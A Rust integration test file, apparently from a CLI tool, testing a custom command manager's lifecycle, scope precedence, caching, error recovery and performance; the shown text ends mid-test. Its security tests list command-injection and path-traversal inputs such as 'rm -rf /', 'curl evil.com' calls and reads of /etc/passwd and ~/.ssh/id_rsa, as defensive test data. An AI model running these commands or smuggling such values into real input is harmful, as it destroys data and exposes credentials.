//! Priority 1: Critical Integration Tests for Commands Subsystem
//!
//! This module implements the highest priority integration tests identified
//! in the arc42 analysis, focusing on:
//! 1. Complete command lifecycle testing
//! 2. File system integration
//! 3. Cache consistency validation
//! 4. Security validation

use std::time::Duration;

use tokio::time::sleep;

use super::CommandManager;
use super::test_utils::*;
use crate::os::Os;
use crate::util::command_types::{
    CommandError,
    CommandScope,
    CustomCommand,
};

/// Test complete command lifecycle: add -> show -> update -> remove
#[tokio::test]
async fn test_complete_command_lifecycle() {
    let test_fs = TestFileSystem::new().expect("Failed to create test filesystem");
    let mut manager = test_fs.create_manager();
    let os = Os::new().await.expect("Failed to create OS instance");

    let command_name = "lifecycle-test";

    // Step 1: Add command
    // Mock the editor opening by setting a dummy editor that does nothing
    unsafe {
        std::env::set_var("EDITOR", "true"); // 'true' command does nothing and exits successfully
    }

    let add_result = manager.add_command(command_name, &os);

    // Restore original editor
    unsafe {
        std::env::remove_var("EDITOR");
    }

    assert!(add_result.is_ok(), "Add command should succeed: {:?}", add_result);

    // Verify file was created
    let expected_file = test_fs.project_commands_dir.join(format!("{}.md", command_name));
    assertions::assert_command_file_exists(&expected_file);

    // Verify command was cached
    assertions::assert_cache_contains_command(manager.get_cache(), command_name);

    // Step 2: Show command (verify it appears in listing)
    let show_result = manager.list_commands_detailed(None);
    assert!(show_result.is_ok(), "Show commands should succeed");

    let commands = show_result.unwrap();
    assert!(!commands.is_empty(), "Should have at least one command");
    assert!(
        commands.iter().any(|cmd| cmd.name == command_name),
        "Added command should appear in listing"
    );

    // Step 3: Update command (simulate editing)
    let updated_content = "# Updated Lifecycle Command\n\nThis command has been updated during testing.";
    std::fs::write(&expected_file, updated_content).expect("Failed to update command file");

    // Clear cache to force reload
    manager.clear_cache_for_test();

    // Verify updated content
    let get_result = manager.get_command(command_name);
    assert!(get_result.is_ok(), "Get command should succeed after update");

    let command = get_result.unwrap();
    assertions::assert_command_has_content(command, "Updated Lifecycle Command");

    // Step 4: Remove command
    let remove_result = std::fs::remove_file(&expected_file);
    assert!(remove_result.is_ok(), "Remove command file should succeed");

    // Clear cache
    manager.clear_cache_for_test();

    // Step 5: Verify command is gone
    let get_result_after_remove = manager.get_command(command_name);
    assert!(
        get_result_after_remove.is_err(),
        "Get command should fail after removal"
    );

    // Verify it doesn't appear in listing
    let final_show_result = manager.list_commands_detailed(None);
    assert!(final_show_result.is_ok(), "Final show should succeed");

    let final_commands = final_show_result.unwrap();
    assert!(
        !final_commands.iter().any(|cmd| cmd.name == command_name),
        "Removed command should not appear in final listing"
    );
}

/// Test cross-scope command interactions (project vs global)
#[tokio::test]
async fn test_cross_scope_command_interactions() {
    let test_fs = TestFileSystem::new().expect("Failed to create test filesystem");
    let mut manager = test_fs.create_manager();

    let command_name = "cross-scope-test";

    // Create project command
    let project_builder = TestCommandBuilder::new(command_name)
        .with_content("# Project Command\n\nThis is a project-scoped command.")
        .with_scope(CommandScope::Project);

    let project_file = project_builder
        .create_in_filesystem(&test_fs)
        .expect("Failed to create project command");

    // Create global command with same name
    let global_builder = TestCommandBuilder::new(command_name)
        .with_content("# Global Command\n\nThis is a global-scoped command.")
        .with_scope(CommandScope::Global);

    let global_file = global_builder
        .create_in_filesystem(&test_fs)
        .expect("Failed to create global command");

    // Test project scope listing
    let project_commands = manager
        .list_commands_detailed(Some(&CommandScope::Project))
        .expect("Failed to list project commands");
    assert_eq!(project_commands.len(), 1, "Should have one project command");
    assertions::assert_command_has_content(&project_commands[0], "Project Command");

    // Test global scope listing
    let global_commands = manager
        .list_commands_detailed(Some(&CommandScope::Global))
        .expect("Failed to list global commands");
    assert_eq!(global_commands.len(), 1, "Should have one global command");
    assertions::assert_command_has_content(&global_commands[0], "Global Command");

    // Test all commands listing
    let all_commands = manager
        .list_commands_detailed(None)
        .expect("Failed to list all commands");
    assert_eq!(all_commands.len(), 2, "Should have two commands total");

    // Test command precedence (project should be found first)
    let found_command = manager.get_command(command_name).expect("Should find command");
    assertions::assert_command_has_content(found_command, "Project Command");

    // Test clearing project scope
    std::fs::remove_file(&project_file).expect("Failed to remove project file");
    manager.clear_cache_for_test();

    // Now global command should be found
    let found_global = manager
        .get_user_command(command_name)
        .expect("Should find global command");
    assertions::assert_command_has_content(found_global, "Global Command");

    // Clean up
    std::fs::remove_file(&global_file).expect("Failed to remove global file");
}

/// Test file system integration scenarios
#[tokio::test]
async fn test_file_system_integration() {
    let test_fs = TestFileSystem::new().expect("Failed to create test filesystem");
    let mut manager = test_fs.create_manager();
    let os = Os::new().await.expect("Failed to create OS instance");

    // Test 1: Directory creation scenarios
    let nested_dir = test_fs
        .temp_dir
        .path()
        .join("deep")
        .join("nested")
        .join(".amazonq")
        .join("commands");
    let mut nested_manager = CommandManager {
        project_commands_dir: nested_dir.clone(),
        user_commands_dir: test_fs.user_commands_dir.clone(),
        cache: std::collections::HashMap::new(),
        bash_preprocessor: crate::util::bash_preprocessor::BashPreprocessor::default(),
    };

    unsafe {
        std::env::set_var("EDITOR", "true");
    }

    let nested_result = nested_manager.add_command("nested-test", &os);

    unsafe {
        std::env::remove_var("EDITOR");
    }

    assert!(nested_result.is_ok(), "Should create nested directories and command");
    assert!(nested_dir.exists(), "Nested directory should be created");

    // Test 2: Permission handling scenarios
    let readonly_dir = test_fs.temp_dir.path().join("readonly");
    std::fs::create_dir(&readonly_dir).expect("Failed to create readonly dir");

    // Create a command file first
    let readonly_file = readonly_dir.join("readonly-test.md");
    std::fs::write(&readonly_file, "# Readonly Test\n\nTest content.").expect("Failed to create readonly file");

    // Make directory read-only
    test_fs
        .simulate_permission_error(&readonly_dir)
        .expect("Failed to simulate permission error");

    // Try to create new command in read-only directory
    let mut readonly_manager = CommandManager {
        project_commands_dir: readonly_dir.clone(),
        user_commands_dir: test_fs.user_commands_dir.clone(),
        cache: std::collections::HashMap::new(),
        bash_preprocessor: crate::util::bash_preprocessor::BashPreprocessor::default(),
    };

    unsafe {
        std::env::set_var("EDITOR", "true");
    }

    let readonly_result = readonly_manager.add_command("new-readonly-test", &os);

    unsafe {
        std::env::remove_var("EDITOR");
    }

    // Should fail with permission error on Unix systems
    // On Windows, directory read-only doesn't prevent file creation the same way
    #[cfg(unix)]
    assert!(
        readonly_result.is_err(),
        "Add command should fail in readonly directory"
    );

    #[cfg(windows)]
    {
        // On Windows, directory read-only attribute doesn't prevent file creation
        // This is expected behavior, so we just log the result
        match readonly_result {
            Ok(_) => println!("Note: Command creation succeeded in readonly directory (expected on Windows)"),
            Err(_) => println!("Note: Command creation failed in readonly directory"),
        }
    }

    // But should still be able to read existing commands
    let existing_command = CustomCommand::from_file(readonly_file);
    // On some systems, making directory read-only might affect file access
    // This is acceptable behavior - either it works or fails gracefully
    if existing_command.is_err() {
        println!("Note: File reading failed in readonly directory (acceptable on some systems)");
    }

    // Test 3: Concurrent file access simulation
    let concurrent_name = "concurrent-test";
    let concurrent_file = test_fs.project_commands_dir.join(format!("{}.md", concurrent_name));

    // Create initial file
    std::fs::write(&concurrent_file, fixtures::SIMPLE_COMMAND).expect("Failed to create concurrent test file");

    // Simulate concurrent modification
    let concurrent_file_clone = concurrent_file.clone();
    let handle = tokio::spawn(async move {
        sleep(Duration::from_millis(50)).await;
        std::fs::write(&concurrent_file_clone, fixtures::COMPLEX_COMMAND_WITH_FRONTMATTER)
            .expect("Failed to modify file concurrently");
    });

    // Try to load command while it's being modified
    sleep(Duration::from_millis(25)).await;
    let load_result = manager.get_command(concurrent_name);

    // Wait for concurrent modification to complete
    handle.await.expect("Concurrent task failed");

    // The load should either succeed with original content or fail gracefully
    match load_result {
        Ok(command) => {
            // If successful, should have some valid content
            assert!(!command.content.is_empty(), "Command content should not be empty");
        },
        Err(_) => {
            // If failed, should be able to retry and succeed
            manager.clear_cache_for_test();
            let retry_result = manager.get_command(concurrent_name);
            assert!(
                retry_result.is_ok(),
                "Retry should succeed after concurrent modification"
            );
        },
    }
}

/// Test cache consistency under various scenarios
#[tokio::test]
async fn test_cache_consistency() {
    let test_fs = TestFileSystem::new().expect("Failed to create test filesystem");
    let mut manager = test_fs.create_manager();

    let command_name = "cache-consistency-test";
    let initial_content = fixtures::SIMPLE_COMMAND;
    let updated_content = fixtures::COMPLEX_COMMAND_WITH_FRONTMATTER;

    // Create initial command file
    let file_path = test_fs
        .create_command_file(command_name, initial_content, CommandScope::Project)
        .expect("Failed to create command file");

    // Test 1: Initial load and caching
    let command1 = manager
        .get_command(command_name)
        .expect("Failed to load command initially");
    assertions::assert_command_has_content(command1, "Simple Test Command");

    // Verify command is cached
    assertions::assert_cache_contains_command(manager.get_cache(), command_name);

    // Test 2: Cache hit behavior
    let command2 = manager.get_command(command_name).expect("Failed to get cached command");
    assertions::assert_command_has_content(command2, "Simple Test Command");

    // Test 3: External file modification (cache should be stale)
    std::fs::write(&file_path, updated_content).expect("Failed to update command file");

    // Get command again - should return cached version (stale)
    let command3 = manager
        .get_command(command_name)
        .expect("Failed to get cached command after external modification");
    assertions::assert_command_has_content(command3, "Simple Test Command");

    // Test 4: Cache invalidation and reload
    manager.clear_cache_for_test();
    let command4 = manager
        .get_command(command_name)
        .expect("Failed to reload command after cache clear");
    assertions::assert_command_has_content(command4, "Complex Test Command");

    // Test 5: Cache consistency after file deletion
    std::fs::remove_file(&file_path).expect("Failed to remove command file");
    manager.clear_cache_for_test();

    let command5 = manager.get_command(command_name);
    assert!(command5.is_err(), "Should fail to get deleted command");

    // Cache should not contain the deleted command
    assertions::assert_cache_not_contains_command(manager.get_cache(), command_name);

    // Test 6: Cache behavior with multiple commands
    let command_names = vec!["cache-test-1", "cache-test-2", "cache-test-3"];

    for name in &command_names {
        test_fs
            .create_command_file(name, fixtures::SIMPLE_COMMAND, CommandScope::Project)
            .expect("Failed to create test command");
    }

    // Load all commands into cache
    for name in &command_names {
        let _command = manager.get_command(name).expect("Failed to load command into cache");
    }

    // Verify all are cached
    for name in &command_names {
        assertions::assert_cache_contains_command(manager.get_cache(), name);
    }

    // Remove one file and clear cache
    let removed_file = test_fs.project_commands_dir.join("cache-test-2.md");
    std::fs::remove_file(&removed_file).expect("Failed to remove test file");
    manager.clear_cache_for_test();

    // Reload - should succeed for existing files, fail for removed
    let result1 = manager.get_command("cache-test-1");
    assert!(result1.is_ok(), "Should load existing command");

    let result2 = manager.get_command("cache-test-2");
    assert!(result2.is_err(), "Should fail to load removed command");

    let result3 = manager.get_command("cache-test-3");
    assert!(result3.is_ok(), "Should load existing command");
}

/// Test security validation scenarios
#[tokio::test]
async fn test_security_validation() {
    let test_fs = TestFileSystem::new().expect("Failed to create test filesystem");
    let mut manager = test_fs.create_manager();
    let os = Os::new().await.expect("Failed to create OS instance");

    // Test 1: Path traversal prevention in command names
    let malicious_names = vec![
        "../../../etc/passwd",
        "..\\..\\windows\\system32\\config",
        "normal/../../../etc/passwd",
        "/absolute/path/command",
        "command;rm -rf /",
        "command`curl evil.com`",
        "command$(whoami)",
    ];

    unsafe {
        std::env::set_var("EDITOR", "true");
    }

    for malicious_name in malicious_names {
        let result = manager.add_command(malicious_name, &os);
        assert!(
            result.is_err(),
            "Should reject malicious command name: {}",
            malicious_name
        );

        // Verify no file was created with malicious name
        let potential_file = test_fs.project_commands_dir.join(format!("{}.md", malicious_name));
        assertions::assert_command_file_not_exists(&potential_file);
    }

    unsafe {
        std::env::remove_var("EDITOR");
    }

    // Test 2: Command content security validation
    let _security_test_file = test_fs
        .create_command_file("security-test", fixtures::SECURITY_TEST_COMMAND, CommandScope::Project)
        .expect("Failed to create security test command");

    // Load command and test execution
    let _command = manager
        .get_command("security-test")
        .expect("Failed to load security test command");

    // Test argument processing with malicious input
    let malicious_args = vec![
        "; rm -rf /",
        "$(curl http://evil.com)",
        "`cat /etc/passwd`",
        "../../../etc/passwd",
        "normal_arg; malicious_command",
        "arg1 && rm -rf /",
        "arg1 | curl evil.com",
    ];

    for malicious_arg in malicious_args {
        let result = manager.execute_command_with_args("security-test", Some(malicious_arg), &os);

        // Should either reject the malicious input or sanitize it
        match result {
            Ok(content) => {
                // If execution succeeds, malicious content should be sanitized
                assert!(
                    !content.contains("rm -rf"),
                    "Malicious rm commands should be sanitized in: {}",
                    content
                );
                assert!(
                    !content.contains("curl http://evil.com"),
                    "Network commands should be sanitized in: {}",
                    content
                );
                assert!(
                    !content.contains("/etc/passwd"),
                    "Sensitive file paths should be sanitized in: {}",
                    content
                );
            },
            Err(error) => {
                // Rejection is also acceptable - verify error message is appropriate
                let error_msg = format!("{}", error);
                assert!(
                    error_msg.contains("Security violation")
                        || error_msg.contains("validation")
                        || error_msg.contains("invalid"),
                    "Security error should have appropriate message: {}",
                    error_msg
                );
            },
        }
    }

    // Test 3: File path validation
    let path_traversal_attempts = vec![
        "../../sensitive_file.txt",
        "/etc/passwd",
        "C:\\Windows\\System32\\config\\SAM",
        "~/.ssh/id_rsa",
        "/proc/self/environ",
    ];

    for malicious_path in path_traversal_attempts {
        // Test file reference processing
        let content_with_path = format!("# Test Command\n\nRead file: {}", malicious_path);
        let path_test_file = test_fs
            .create_command_file("path-test", &content_with_path, CommandScope::Project)
            .expect("Failed to create path test command");

        let result = manager.execute_command_with_args("path-test", None, &os);

        // Should either sanitize the path or reject the command
        match result {
            Ok(processed_content) => {
                // If processing succeeds, sensitive paths should be sanitized
                assert!(
                    !processed_content.contains("/etc/passwd")
                        || !processed_content.contains("C:\\Windows\\System32")
                        || processed_content.contains("sanitized")
                        || processed_content.contains("blocked"),
                    "Sensitive paths should be sanitized in: {}",
                    processed_content
                );
            },
            Err(_) => {
                // Rejection is also acceptable for security reasons
            },
        }

        // Clean up
        std::fs::remove_file(&path_test_file).expect("Failed to remove path test file");
        manager.clear_cache_for_test();
    }

    // Test 4: YAML frontmatter security
    let malicious_frontmatter = r#"---
allowed_tools: ["execute_bash", "fs_write", "use_aws"]
timeout_seconds: 999999
malicious_field: "$(rm -rf /)"
---

# Malicious Frontmatter Command

This command has potentially dangerous frontmatter.
"#;

    let frontmatter_file = test_fs
        .create_command_file(
            "frontmatter-security-test",
            malicious_frontmatter,
            CommandScope::Project,
        )
        .expect("Failed to create frontmatter security test");

    let frontmatter_result = manager.get_command("frontmatter-security-test");

    match frontmatter_result {
        Ok(command) => {
            // If loading succeeds, verify security constraints are applied
            assert!(
                command.frontmatter.timeout_seconds.unwrap_or(0) <= 300, // Max 5 minutes
                "Timeout should be limited for security"
            );

            // Verify dangerous tools are filtered
            let allowed_tools = &command.frontmatter.allowed_tools;
            assert!(
                !allowed_tools.contains(&"execute_bash".to_string()) || allowed_tools.len() <= 3, // Reasonable limit
                "Dangerous tool combinations should be limited"
            );
        },
        Err(_) => {
            // Rejection of malicious frontmatter is also acceptable
        },
    }

    // Clean up
    std::fs::remove_file(&frontmatter_file).expect("Failed to remove frontmatter test file");
}

/// Test error handling and recovery scenarios
#[tokio::test]
async fn test_error_handling_and_recovery() {
    let test_fs = TestFileSystem::new().expect("Failed to create test filesystem");
    let mut manager = test_fs.create_manager();

    // Test 1: Recovery from malformed YAML frontmatter
    let malformed_file = test_fs
        .create_command_file(
            "malformed-yaml",
            fixtures::MALFORMED_YAML_COMMAND,
            CommandScope::Project,
        )
        .expect("Failed to create malformed command");

    let load_result = manager.get_command("malformed-yaml");

    // Should either fail gracefully or recover with default frontmatter
    match load_result {
        Ok(command) => {
            // If recovery succeeds, should have some content
            assert!(!command.content.is_empty(), "Recovered command should have content");
            assert!(!command.name.is_empty(), "Recovered command should have name");
        },
        Err(error) => {
            // If fails, should provide helpful error message
            let error_msg = format!("{:?}", error);
            assert!(
                error_msg.contains("yaml") || error_msg.contains("frontmatter") || error_msg.contains("parse"),
                "Error message should indicate YAML/frontmatter issue: {}",
                error_msg
            );
        },
    }

    // Test 2: Recovery from corrupted command file
    let corrupted_file = test_fs.project_commands_dir.join("corrupted.md");

    // Create file with binary data
    let binary_data = vec![0xff, 0xfe, 0x00, 0x01, 0x02, 0x03];
    std::fs::write(&corrupted_file, binary_data).expect("Failed to create corrupted file");

    let corrupted_result = manager.get_command("corrupted");
    assert!(corrupted_result.is_err(), "Should fail to load corrupted file");

    // Error should be informative
    match corrupted_result.unwrap_err() {
        CommandError::Io(_) => {
            // IO error is expected for corrupted files
        },
        CommandError::InvalidFormat(msg) => {
            assert!(
                msg.contains("utf") || msg.contains("encoding") || msg.contains("format"),
                "Format error should be descriptive: {}",
                msg
            );
        },
        other => {
            panic!("Unexpected error type for corrupted file: {:?}", other);
        },
    }

    // Test 3: Recovery from partial file operations
    let partial_file = test_fs.project_commands_dir.join("partial.md");

    // Create empty file to simulate interrupted write
    std::fs::write(&partial_file, "").expect("Failed to create empty file");

    let partial_result = manager.get_command("partial");

    // Should handle empty files gracefully
    match partial_result {
        Ok(command) => {
            // If succeeds, should have minimal valid content
            assert!(!command.name.is_empty(), "Command should have valid name");
            assert_eq!(command.name, "partial", "Command name should match filename");
        },
        Err(error) => {
            // Failure is also acceptable for empty files
            let error_msg = format!("{:?}", error);
            assert!(
                error_msg.contains("empty") || error_msg.contains("invalid") || error_msg.contains("format"),
                "Error should indicate empty/invalid file: {}",
                error_msg
            );
        },
    }

    // Test 4: Directory permission recovery
    let permission_test_dir = test_fs.temp_dir.path().join("permission_test");
    std::fs::create_dir(&permission_test_dir).expect("Failed to create permission test dir");

    // Create command file first
    let permission_file = permission_test_dir.join("permission-test.md");
    std::fs::write(&permission_file, fixtures::SIMPLE_COMMAND).expect("Failed to create permission test file");

    // Make directory read-only
    test_fs
        .simulate_permission_error(&permission_test_dir)
        .expect("Failed to simulate permission error");

    // Try to read existing file - should still work
    let existing_command = CustomCommand::from_file(permission_file.clone());
    // On some systems, permission errors might affect file reading
    // This is acceptable behavior - either it works or fails gracefully
    if existing_command.is_err() {
        println!("Note: File reading failed with permission error (acceptable on some systems)");
    }

    // Test 5: Network/storage failure simulation
    // Simulate slow storage by creating a very large file
    test_fs.simulate_disk_full().expect("Failed to simulate disk full");

    // Operations should still work for existing small files
    let small_file = test_fs
        .create_command_file("small-test", "# Small\n\nSmall command.", CommandScope::Project)
        .expect("Failed to create small test file");

    let small_command = manager.get_command("small-test");
    assert!(
        small_command.is_ok(),
        "Should handle small files even with disk pressure"
    );

    // Clean up
    std::fs::remove_file(&malformed_file).expect("Failed to remove malformed file");
    std::fs::remove_file(&corrupted_file).expect("Failed to remove corrupted file");
    std::fs::remove_file(&partial_file).expect("Failed to remove partial file");
    std::fs::remove_file(&small_file).expect("Failed to remove small file");
}

/// Test performance characteristics with realistic loads
#[tokio::test]
async fn test_performance_characteristics() {
    let test_fs = TestFileSystem::new().expect("Failed to create test filesystem");
    let mut manager = test_fs.create_manager();

    let num_commands = 50; // Reasonable number for CI testing
    let start_time = std::time::Instant::now();

    // Create many commands with varying sizes
    for i in 0..num_commands {
        let command_name = format!("perf-test-{:03}", i);
        let content = if i % 10 == 0 {
            // Every 10th command is large
            fixtures::LARGE_COMMAND
        } else if i % 5 == 0 {
            // Every 5th command has frontmatter
            fixtures::COMPLEX_COMMAND_WITH_FRONTMATTER
        } else {
            // Most commands are simple
            fixtures::SIMPLE_COMMAND
        };

        test_fs
            .create_command_file(&command_name, content, CommandScope::Project)
            .expect("Failed to create performance test command");
    }

    let creation_time = start_time.elapsed();
    println!("Created {} commands in {:?}", num_commands, creation_time);

    // Test listing performance
    let list_start = std::time::Instant::now();
    let commands = manager.list_commands_detailed(None).expect("Failed to list commands");
    let list_time = list_start.elapsed();

    assert_eq!(commands.len(), num_commands, "Should list all created commands");
    println!("Listed {} commands in {:?}", num_commands, list_time);

    // Test individual command loading performance
    let load_start = std::time::Instant::now();
    for i in 0..10 {
        // Test first 10 commands
        let command_name = format!("perf-test-{:03}", i);
        let _command = manager.get_command(&command_name).expect("Failed to load command");
    }
    let load_time = load_start.elapsed();
    println!("Loaded 10 commands in {:?}", load_time);

    // Test cache performance
    let cache_start = std::time::Instant::now();
    for i in 0..10 {
        // Load same commands again (should hit cache)
        let command_name = format!("perf-test-{:03}", i);
        let _command = manager
            .get_command(&command_name)
            .expect("Failed to load cached command");
    }
    let cache_time = cache_start.elapsed();
    println!("Loaded 10 cached commands in {:?}", cache_time);

    // Performance assertions (adjusted for CI environment)
    assert!(
        list_time < Duration::from_millis(2000),
        "Listing {} commands should take less than 2 seconds, took {:?}",
        num_commands,
        list_time
    );

    assert!(
        load_time < Duration::from_millis(1000),
        "Loading 10 commands should take less than 1 second, took {:?}",
        load_time
    );

    assert!(
        cache_time < Duration::from_millis(100),
        "Loading 10 cached commands should take less than 100ms, took {:?}",
        cache_time
    );

    // Cache should be significantly faster than initial load
    assert!(
        cache_time < load_time / 2,
        "Cache should be at least 2x faster than initial load. Load: {:?}, Cache: {:?}",
        load_time,
        cache_time
    );

    // Test memory usage (basic check)
    let cache_size = manager.get_cache().len();
    assert!(
        cache_size <= 10,
        "Cache should contain loaded commands, got {} entries",
        cache_size
    );
}

/// Test command execution with real filesystem operations
/// This covers argument substitution, file reference processing, and security validation during
/// execution
#[tokio::test]
async fn test_command_execution_with_real_filesystem() {
    let test_fs = TestFileSystem::new().expect("Failed to create test filesystem");
    let mut manager = test_fs.create_manager();
    let os = Os::new().await.expect("Failed to create OS instance");

    // Test 1: Command with argument substitution
    let arg_substitution_command = r#"
# Argument Test Command

This command tests argument substitution.

## Instructions
Process the argument: $ARGUMENTS

## Context
The argument should be safely substituted.
"#;

    let arg_test_file = test_fs
        .create_command_file("arg-test", arg_substitution_command, CommandScope::Project)
        .expect("Failed to create argument test command");

    // Test argument substitution with safe input
    let safe_arg = "test-value";
    let result = manager.execute_command_with_args("arg-test", Some(safe_arg), &os);

    match result {
        Ok(content) => {
            assert!(content.contains(safe_arg), "Safe argument should be substituted");
            assert!(!content.contains("$ARGUMENTS"), "Template should be replaced");
        },
        Err(error) => {
            // If execution fails, it should be for a valid reason
            let error_msg = format!("{:?}", error);
            assert!(
                error_msg.contains("not found") || error_msg.contains("execution") || error_msg.contains("file"),
                "Error should be execution-related, not security: {}",
                error_msg
            );
        },
    }

    // Test 2: File reference processing
    let file_ref_command = r#"
# File Reference Command

This command processes file references.

## Instructions
Read the configuration from: config.json

## Context
File references should be validated for security.
"#;

    let file_ref_test_file = test_fs
        .create_command_file("file-ref-test", file_ref_command, CommandScope::Project)
        .expect("Failed to create file reference test command");

    // Create a test file to reference
    let config_file = test_fs.temp_dir.path().join("config.json");
    std::fs::write(&config_file, r#"{"test": "value"}"#).expect("Failed to create config file");

    let file_ref_result = manager.execute_command_with_args("file-ref-test", None, &os);

    // File reference processing should either work or fail securely
    match file_ref_result {
        Ok(content) => {
            // If successful, should contain processed content
            assert!(!content.is_empty(), "Processed content should not be empty");
        },
        Err(_) => {
            // Failure is acceptable for file reference processing
        },
    }

    // Test 3: Security validation during execution
    let security_test_command = r#"
# Security Test Command

This command tests security during execution.

## Instructions
Execute: echo "safe command"

## Context
Only safe commands should be allowed.
"#;

    let security_test_file = test_fs
        .create_command_file("security-exec-test", security_test_command, CommandScope::Project)
        .expect("Failed to create security execution test command");

    // Test with potentially dangerous argument
    let dangerous_arg = "; rm -rf /";
    let security_result = manager.execute_command_with_args("security-exec-test", Some(dangerous_arg), &os);

    match security_result {
        Ok(content) => {
            // If execution succeeds, dangerous content should be sanitized
            assert!(
                !content.contains("rm -rf"),
                "Dangerous commands should be sanitized: {}",
                content
            );
        },
        Err(error) => {
            // Security rejection is preferred
            let error_msg = format!("{}", error);
            assert!(
                error_msg.contains("Security violation") || error_msg.contains("invalid"),
                "Should be security-related error: {}",
                error_msg
            );
        },
    }

    // Test 4: Real filesystem operations
    let fs_operation_command = r#"
# Filesystem Operation Command

This command performs real filesystem operations.

## Instructions
List files in current directory.

## Context
Filesystem operations should be controlled and secure.
"#;

    let fs_op_file = test_fs
        .create_command_file("fs-op-test", fs_operation_command, CommandScope::Project)
        .expect("Failed to create filesystem operation test command");

    let fs_result = manager.execute_command_with_args("fs-op-test", None, &os);

    // Filesystem operations should be handled appropriately
    match fs_result {
        Ok(content) => {
            // If successful, should contain some output
            assert!(!content.trim().is_empty(), "Filesystem operation should produce output");
        },
        Err(error) => {
            // Failure should be informative
            let error_msg = format!("{:?}", error);
            assert!(
                error_msg.contains("permission") || error_msg.contains("not found") || error_msg.contains("execution"),
                "Error should be filesystem-related: {}",
                error_msg
            );
        },
    }

    // Clean up
    std::fs::remove_file(&arg_test_file).expect("Failed to remove arg test file");
    std::fs::remove_file(&file_ref_test_file).expect("Failed to remove file ref test file");
    std::fs::remove_file(&security_test_file).expect("Failed to remove security test file");
    std::fs::remove_file(&fs_op_file).expect("Failed to remove fs op test file");
    let _ = std::fs::remove_file(&config_file);
}

/// Test cache performance under load with 100+ commands
/// This validates cache hit ratios and memory usage patterns
#[tokio::test]
async fn test_cache_performance_under_load() {
    let test_fs = TestFileSystem::new().expect("Failed to create test filesystem");
    let mut manager = test_fs.create_manager();

    let num_commands = 150; // Test with significant load
    println!("Creating {} commands for cache performance test", num_commands);

    // Create many commands
    for i in 0..num_commands {
        let command_name = format!("cache-perf-{:03}", i);
        let content = if i % 10 == 0 {
            // Some complex commands
            fixtures::COMPLEX_COMMAND_WITH_FRONTMATTER
        } else {
            // Most are simple
            fixtures::SIMPLE_COMMAND
        };

        test_fs
            .create_command_file(&command_name, content, CommandScope::Project)
            .expect("Failed to create cache performance test command");
    }

    // Test 1: Initial loading performance
    let load_start = std::time::Instant::now();
    let mut loaded_count = 0;

    for i in 0..num_commands {
        let command_name = format!("cache-perf-{:03}", i);
        match manager.get_command(&command_name) {
            Ok(_command) => {
                loaded_count += 1;
            },
            Err(error) => {
                panic!("Failed to load command {}: {:?}", command_name, error);
            },
        }
    }

    let load_time = load_start.elapsed();
    println!("Loaded {} commands in {:?}", loaded_count, load_time);

    // Verify all commands were loaded
    assert_eq!(loaded_count, num_commands, "Should load all commands");

    // Performance assertion: should load commands reasonably quickly
    assert!(
        load_time.as_millis() < 5000, // 5 seconds max for 150 commands
        "Loading {} commands took too long: {:?}",
        num_commands,
        load_time
    );

    // Test 2: Cache hit performance
    let cache_start = std::time::Instant::now();
    let mut cache_hits = 0;

    // Load same commands again - should all be cache hits
    for i in 0..num_commands {
        let command_name = format!("cache-perf-{:03}", i);
        match manager.get_command(&command_name) {
            Ok(_) => cache_hits += 1,
            Err(error) => {
                panic!("Cache hit failed for command {}: {:?}", command_name, error);
            },
        }
    }

    let cache_time = cache_start.elapsed();
    println!("Cache hits for {} commands in {:?}", cache_hits, cache_time);

    // Cache hits should be much faster than initial loads
    assert!(
        cache_time < load_time / 2,
        "Cache hits should be faster than initial loads: cache={:?}, load={:?}",
        cache_time,
        load_time
    );

    // Test 3: Cache hit ratio validation
    assert_eq!(
        cache_hits, num_commands,
        "All commands should be cache hits: {}/{}",
        cache_hits, num_commands
    );

    // Test 4: Memory usage validation
    let cache_size = manager.get_cache().len();
    assert_eq!(
        cache_size, num_commands,
        "Cache should contain all loaded commands: {}/{}",
        cache_size, num_commands
    );

    // Test 5: Cache performance under mixed operations
    let mixed_start = std::time::Instant::now();

    // Mix of cache hits and new operations
    for i in 0..50 {
        let command_name = format!("cache-perf-{:03}", i);
        let _ = manager.get_command(&command_name); // Cache hit

        if i % 10 == 0 {
            // Occasional cache clear to test reload performance
            manager.clear_cache_for_test();
            let _ = manager.get_command(&command_name); // Cache miss, reload
        }
    }

    let mixed_time = mixed_start.elapsed();
    println!("Mixed cache operations completed in {:?}", mixed_time);

    // Mixed operations should still be reasonably fast
    assert!(
        mixed_time.as_millis() < 2000, // 2 seconds max for mixed operations
        "Mixed cache operations took too long: {:?}",
        mixed_time
    );

    // Test 6: Cache memory efficiency
    // Estimate memory usage (rough calculation)
    let avg_command_size = 1024; // Assume ~1KB per command
    let estimated_memory = cache_size * avg_command_size;

    println!(
        "Estimated cache memory usage: {} bytes for {} commands",
        estimated_memory, cache_size
    );

    // Memory usage should be reasonable (less than 50MB for 150 commands as per plan)
    assert!(
        estimated_memory < 50 * 1024 * 1024,
        "Cache memory usage too high: {} bytes",
        estimated_memory
    );

    // Clean up test files
    for i in 0..num_commands {
        let command_name = format!("cache-perf-{:03}", i);
        let file_path = test_fs.project_commands_dir.join(format!("{}.md", command_name));
        let _ = std::fs::remove_file(&file_path);
    }
}

// =============================================================================
// Priority 2: Robustness Tests
// =============================================================================

/// Test error handling scenarios including disk full conditions
/// This covers graceful failure handling and recovery mechanisms
#[tokio::test]
async fn test_disk_full_scenarios() {
    let test_fs = TestFileSystem::new().expect("Failed to create test filesystem");
    let mut manager = test_fs.create_manager();
    let os = Os::new().await.expect("Failed to create OS instance");

    // Test 1: Simulate disk space issues during command creation
    // Create a command that should work normally first
    unsafe {
        std::env::set_var("EDITOR", "true"); // Mock editor
    }

    let result = manager.add_command("disk-test", &os);

    match result {
        Ok(_) => {
            // Verify the command was created successfully
            let expected_file = test_fs.project_commands_dir.join("disk-test.md");
            assert!(expected_file.exists(), "Command file should be created");
        },
        Err(error) => {
            // If it fails due to disk space, error should be informative
            let error_msg = format!("{:?}", error);
            assert!(
                error_msg.contains("space")
                    || error_msg.contains("disk")
                    || error_msg.contains("write")
                    || error_msg.contains("permission")
                    || error_msg.contains("Io"),
                "Disk-related error should be informative: {}",
                error_msg
            );
        },
    }

    // Test 2: Recovery after potential disk space issues
    // Try to create another command after potential issues
    let recovery_result = manager.add_command("recovery-test", &os);

    // Recovery should work or fail gracefully
    match recovery_result {
        Ok(_) => {
            // Verify recovery worked
            let recovery_file = test_fs.project_commands_dir.join("recovery-test.md");
            assert!(recovery_file.exists(), "Recovery command file should be created");
        },
        Err(error) => {
            // Recovery failure should be handled gracefully
            let error_msg = format!("{:?}", error);
            assert!(
                !error_msg.is_empty(),
